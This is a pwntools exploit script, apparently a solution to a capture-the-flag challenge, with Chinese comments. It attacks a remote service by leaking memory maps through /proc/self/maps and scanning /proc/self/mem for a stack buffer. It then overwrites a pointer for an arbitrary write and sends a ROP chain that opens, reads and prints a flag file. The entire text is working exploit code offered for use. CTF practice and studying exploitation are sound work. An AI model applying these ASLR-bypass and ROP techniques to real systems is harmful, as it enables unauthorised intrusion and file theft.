from pwn import *  

# context.log_level = 'DEBUG'
elf = context.binary = ELF('../file/cab92757a3ca4246a7a7eb7c880e20d9')  

while True: # 每次地址映射是随机的，多次尝试直到找到对应的地址
   # sh = process('../file/cab92757a3ca4246a7a7eb7c880e20d9')  # 本地无法运行，环境为wsl下的Ubuntu22.04
   sh = remote('61.147.171.105', '60261')  

   open_s_plt = elf.plt['open']  
   read_s_plt = elf.plt['read']  
   puts_s_plt = elf.plt['puts']

   #pop rsi  
   #pop r15  
   #retn  
   pop_s_rsi = 0x1821  
   #pop rdi  
   #retn  
   pop_s_rdi = 0x1823  
     
   def enterRoom():  
      sh.sendlineafter(b'Do you want to help me build my room? Y/n?\n', b'Y')  
     
   def setPath(content):
      if not isinstance(content, bytes):
         content = content.encode()
      sh.sendlineafter(b'5.Exit\n', b'1')  
      sh.sendlineafter(b'So man, what are you finding?\n', content)  
     
   def seekTo(pos):  
      sh.sendlineafter(b'5.Exit\n', b'2')  
      sh.sendlineafter(b'So, Where are you?\n', str(pos).encode())  
     
   def readSomething(length):  
      sh.sendlineafter(b'5.Exit\n', b'3')  
      sh.sendlineafter(b'How many things do you want to get?\n', str(length).encode())  
     
   def giveSomething(content):
      if not isinstance(content, bytes):
         content = content.encode()
      sh.sendlineafter(b'5.Exit\n', b'4')  
      sh.sendlineafter(b'content:', content)  
     
   enterRoom()  
   setPath('/proc/self/maps')  
   readSomething(2000)  
   sh.recvuntil(b'You get something:\n')  

   #解析程序的加载地址，以及mmap内存出的地址  
   elf_base = int(sh.recvuntil(b'-').split(b'-')[0], 16)  
   pop_rdi = elf_base + pop_s_rdi  
   pop_rsi = elf_base + pop_s_rsi  
   open_addr = elf_base + open_s_plt  
   read_addr = elf_base + read_s_plt  
   puts_addr = elf_base + puts_s_plt  
     
   while True:  
      line = sh.recvline()
      if b'heap' in line:  
         #接下来这一行就是mmap出的内存的信息  
         line = sh.recvline().decode()
         mmap_start = int(line.split('-')[0], 16)  
         mmap_end = int(line.split('-')[1].split(' ')[0], 16)  
         break

   stack_end = mmap_end  
   stack_start = mmap_start  

   #区间范围里搜索
   offset = 0xfc00000
   begin_off = stack_end - offset - 24 * 100000  
   setPath('/proc/self/mem')  
   seekTo(begin_off)
   print('begin->', hex(begin_off))

   #在内存的范围内搜索，如果找到了/proc/self/mem这个字符串，说明当前地址就是buf的栈地址  
   for i in range(0, 24):  
      readSomething(100000)  
      content = sh.recvuntil(b'1.Find ', drop=True)
      if b'/proc/self/mem' in content:  
         print('found!')  
         arr = content.split(b'/proc/self/mem')[0]  
         break  
   if i == 23:  
      print('未能成功确定v8的地址，请重试!')
      sh.close()
      continue

   #获得了v8的地址，可以将它里面的内容，实现任意地址写  
   v8_addr = begin_off + i * 100000 + len(arr) + 5
   print('v8 addr=', hex(v8_addr))
   read_ret = v8_addr - 0x50

   #覆盖v8指针内容为存放read返回地址的栈地址  
   payload = b'/proc/self/mem'.ljust(24, b'\x00') + p64(read_ret)  
   setPath(payload)  

   #接下来，我们可以写rop了(v8_addr-24+15处就是/home/ctf/flag字符串)  
   rop = p64(pop_rdi) + p64(read_ret + 15 * 8) + p64(pop_rsi) + p64(0) + p64(0) + p64(open_addr) 

   #我们打开的文件，描述符为6  
   rop += p64(pop_rdi) + p64(6) + p64(pop_rsi) + p64(read_ret + 15 * 8) + p64(0) + p64(read_addr)  
   rop += p64(pop_rdi) + p64(read_ret + 15 * 8) + p64(puts_addr)  
   rop += b'/home/ctf/flag\x00'  
     
   giveSomething(rop)  
     
   sh.interactive()